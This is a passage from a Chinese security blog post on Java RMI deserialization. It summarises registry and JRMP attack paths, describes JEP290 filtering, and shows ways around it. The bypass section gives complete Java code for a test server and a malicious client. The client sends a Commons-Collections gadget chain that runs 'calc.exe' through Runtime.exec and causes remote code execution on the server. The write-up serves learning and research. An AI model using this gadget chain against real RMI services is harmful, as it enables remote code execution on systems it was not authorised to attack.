+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过ysoserial开启一个恶意JRMP服务端，客户端lookup到这个服务端就会被RCE</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h3><ul>
+<li>服务端攻击Registry注册中心：  通过使用Registry连接到注册中心，然后把gadget chain对象bind注册到注册中心，从而引起注册中心反序列化RCE 。</li>
+<li>JRMP协议客户端攻击注册中心（服务端） ： 使用JRMP协议，直接发送gadget chain的序列化数据到服务端，从而引起服务端反序列化RCE 。</li>
+<li>JRMP协议注册中心（服务端）攻击客户端：使用JRMP协议，当客户端连上后，直接返回gadget chain的序列化数据给客户端，从而引起客户端反序列化RCE。</li>
+</ul>
+<blockquote>
+<p>即是说后面两个攻击法在 <a href="https://xz.aliyun.com/t/7079#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079#toc-3</a> 中称为JRMP客户端服务端的对打；但是在天融信文章 <a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">https://paper.seebug.org/1194/</a> 中称为注册中心攻击客户端和客户端攻击注册中心。他们的示例都是一样的，所以我进行了这样的理解，比较好进行解释。</p>
+</blockquote>
+<h2 id="0x03-JDK的防御"><a href="#0x03-JDK的防御" class="headerlink" title="0x03 JDK的防御"></a>0x03 JDK的防御</h2><h3 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h3><p>在<code>JDK6u141</code>、<code>JDK7u131</code>、<code>JDK8u121</code>加入了JEP 290限制，JEP 290过滤策略有：</p>
+<ul>
+<li>自定义过滤器。</li>
+<li>内置过滤器。</li>
+</ul>
+<h3 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h3><p> 可以使用自定义过滤器来重写特定流的进程级过滤器 。</p>
+<h3 id="内置过滤器"><a href="#内置过滤器" class="headerlink" title="内置过滤器"></a>内置过滤器</h3><p>JDK分别为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。例如：JDK版本换成JDK1.8.0_181，就默认使用内置过滤器。可用白名单列表如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String.class</span><br><span class="line">Number.class</span><br><span class="line">Remote.class</span><br><span class="line">Proxy.class</span><br><span class="line">UnicastRef.class</span><br><span class="line">RMIClientSocketFactory.class</span><br><span class="line">RMIServerSocketFactory.class</span><br><span class="line">ActivationID.class</span><br><span class="line">UID.class</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x04-绕过JEP290"><a href="#0x04-绕过JEP290" class="headerlink" title="0x04 绕过JEP290"></a>0x04 绕过JEP290</h2><h3 id="UnicastRef对象"><a href="#UnicastRef对象" class="headerlink" title="UnicastRef对象"></a>UnicastRef对象</h3><p>用<strong>UnicastRef对象新建一个RMI连接</strong>绕过JEP290的限制，下面是ysoserial的payload：</p>
+<p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/10.png" alt></p>
+<p>原理就是利用在白名单的UnicastRef类来发起一个RMI连接,在高版本jdk下ysoserial的JRMPListener依然可以利用。</p>
+<h3 id="用Object绕JEP290限制"><a href="#用Object绕JEP290限制" class="headerlink" title="用Object绕JEP290限制"></a>用Object绕JEP290限制</h3><p>JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器，在<strong>RMI客户端和服务端在通信时参数传递</strong>这块是没有做处理的，而参数传递也是基于序列化数据传输,那么如果参数是泛型的payload，传输依然会有问题。</p>
+<p>首先定义HelloInterface接口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">public interface HelloInterface extends java.rmi.Remote &#123;</span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException;</span><br><span class="line">    public Object sayPayload(Object from) throws java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意sayPayload方法的返回类型就是Object – Object在Java中是各种类型的根类。</p>
+</blockquote>
+<p>然后实现接口HelloImpl：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class HelloImpl extends UnicastRemoteObject implements HelloInterface &#123;</span><br><span class="line">    public HelloImpl() throws java.rmi.RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String sayHello(String from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return &quot;sayHello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Object sayPayload(Object from) throws java.rmi.RemoteException &#123;</span><br><span class="line">        System.out.println(&quot;Hello from &quot; + from + &quot;!!&quot;);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实现服务端（把注册中心也写在了服务端里面）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import java.rmi.AlreadyBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class HelloServer &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            LocateRegistry.createRegistry(1099);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            registry.bind(&quot;hello&quot;, new Rmi.ObjectBypassJEP.HelloImpl());</span><br><span class="line">        &#125; catch (RemoteException | AlreadyBoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;while(true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实现恶意客户端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">package Rmi.ObjectBypassJEP;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line">import javax.management.BadAttributeValueExpException;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class HelloClient &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(1099);</span><br><span class="line">            HelloInterface hello = (HelloInterface) registry.lookup(&quot;hello&quot;);</span><br><span class="line"></span><br><span class="line">            Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                    new ConstantTransformer(Runtime.class),</span><br><span class="line">                    new InvokerTransformer(&quot;getMethod&quot;,</span><br><span class="line">                            new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                            new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;invoke&quot;,</span><br><span class="line">                            new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                            new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                    new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                            new Class[]&#123;String.class&#125;,</span><br><span class="line">                            new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">            TiedMapEntry entry = new TiedMapEntry(lazyMap, &quot;foo&quot;);</span><br><span class="line">            BadAttributeValueExpException poc = new BadAttributeValueExpException(null);</span><br><span class="line">            Field valfield = poc.getClass().getDeclaredField(&quot;val&quot;);</span><br><span class="line">            valfield.setAccessible(true);</span><br><span class="line">            valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line">            hello.sayPayload(poc);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>同样的恶意客户端先通过getRegistry获取注册中心（服务端）并lookup绑定的hello。随后构造恶意类并调用绑定的方法，即可传恶意序列化数据使服务端RCE。</p>
+</blockquote>
+<p>我在JDK8u211的版本下能成功执行弹出服务端的计算器，如下所示：</p>
+<p><img src="/2020/07/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI/11.png" alt></p>
+<p>然而在实际使用场景很少有参数是Object类型的，而攻击者可以完全操作客户端,因此可以用恶意对象替换从Object类派生的参数(例如String)，具体有如下四种bypass的思路：</p>
+<blockquote>
+<p>际使用场景很少有参数是Object类型：即是说服务端很少有人会写返回类型是Object型的方法的。</p>
+</blockquote>
+<ul>
+<li>将java.rmi包的代码复制到新包，并在新包中修改相应的代码</li>
+<li>将调试器附加到正在运行的客户端，并在序列化之前替换这些对象</li>
+<li>使用诸如Javassist这样的工具修改字节码</li>
+<li>通过实现代理替换网络流上已经序列化的对象</li>
+</ul>
+<p>未完待续…</p>
+<h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul>
+<li><a href="https://paper.seebug.org/1194/" target="_blank" rel="noopener">https://paper.seebug.org/1194/</a> </li>
+<li><a href="https://xz.aliyun.com/t/6660" target="_blank" rel="noopener">https://xz.aliyun.com/t/6660</a> </li>
+<li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">https://xz.aliyun.com/t/7079</a> </li>
+<li><a href="https://xz.aliyun.com/t/7264#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/7264#toc-2</a> </li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/24/JDK/" rel="next" title="JDK">
+                <i class="fa fa-chevron-left"></i> JDK
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/07/26/CSP%E7%BB%95%E8%BF%87/" rel="prev" title="CSP绕过">
+                CSP绕过 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">白仁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#反序列化之RMI"><span class="nav-number">1.</span> <span class="nav-text">反序列化之RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-简介"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-初探"><span class="nav-number">1.2.</span> <span class="nav-text">0x01 初探</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注册中心"><span class="nav-number">1.2.1.</span> <span class="nav-text">注册中心</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端"><span class="nav-number">1.2.2.</span> <span class="nav-text">服务端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#客户端"><span class="nav-number">1.2.3.</span> <span class="nav-text">客户端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#结果"><span class="nav-number">1.2.4.</span> <span class="nav-text">结果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过程"><span class="nav-number">1.2.5.</span> <span class="nav-text">过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-打法"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 打法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#服务端攻击注册中心"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">服务端攻击注册中心</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JRMP客户端攻击注册中心（服务端）"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">JRMP客户端攻击注册中心（服务端）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注册中心（JRMP服务端）攻击客户端"><span class="nav-number">1.3.1.</span> <span class="nav-text">注册中心（JRMP服务端）攻击客户端</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击总结"><span class="nav-number">1.3.2.</span> <span class="nav-text">攻击总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-JDK的防御"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 JDK的防御</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JEP290"><span class="nav-number">1.4.1.</span> <span class="nav-text">JEP290</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#自定义过滤器"><span class="nav-number">1.4.2.</span> <span class="nav-text">自定义过滤器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内置过滤器"><span class="nav-number">1.4.3.</span> <span class="nav-text">内置过滤器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-绕过JEP290"><span class="nav-number">1.5.</span> <span class="nav-text">0x04 绕过JEP290</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UnicastRef对象"><span class="nav-number">1.5.1.</span> <span class="nav-text">UnicastRef对象</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用Object绕JEP290限制"><span class="nav-number">1.5.2.</span> <span class="nav-text">用Object绕JEP290限制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-参考链接"><span class="nav-number">1.6.</span> <span class="nav-text">0x05 参考链接</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">白仁</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
